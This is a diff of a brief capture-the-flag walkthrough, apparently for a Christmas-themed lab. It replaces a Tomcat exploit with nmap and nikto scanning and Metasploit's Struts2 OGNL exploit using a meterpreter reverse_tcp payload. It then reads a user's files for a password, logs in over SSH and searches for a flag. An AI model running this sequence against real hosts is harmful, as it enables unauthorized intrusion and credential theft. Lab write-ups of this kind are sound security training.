@@ -1,5 +1,22 @@
 1) run an nmap scan on your IP (remember to connect to the network with openvpn, I definetly didn't waste 20 mins wondering why i couldnt find an open port)
 2) we now know there are 3 ports open, 22 (ssh), 80 (a web server, Apache Tomcat/Coyote JSP engine 1.1), and 111 (rpcbind)
-3) msfconsole
-4) search 'Apache Tomcat/Coyote JSP engine 1.1'`
-5) use exploit/multi/http/tomcat_jsp_upload_bypass
+3) run a nikto scan on the host, nikto --host IP. we see its vunerable to the "strutshock" vunerability and it lists some cves
+4) msfconsole
+5) search 'struts2`
+6) use exploit/multi/http/strusts2_content_type_ognl
+7) set PAYLOAD linux/x86/meterpreter/reverse_tcp
+8) set RHOSTS {IP}
+9) set RPORT 0080
+10) set TARGETURI /showcase.action
+11) do sudo ifconfig -a, and set LHOST {LOCALIP}
+12) exploit
+13) cd /home/santa
+14) cat *
+15) password is in the file
+16) ssh santa@IP, with password found
+17) sed -n 148p naughtylist.txt, gives you the 148th line
+18) sed -n 52p nicelist.txt, gives you the 52nd line
+19) go back to the meterpreter
+21) find doesnt work so enter the command, shell
+22) find / 2>>/dev/null | grep -i flag1
+23) cat that file
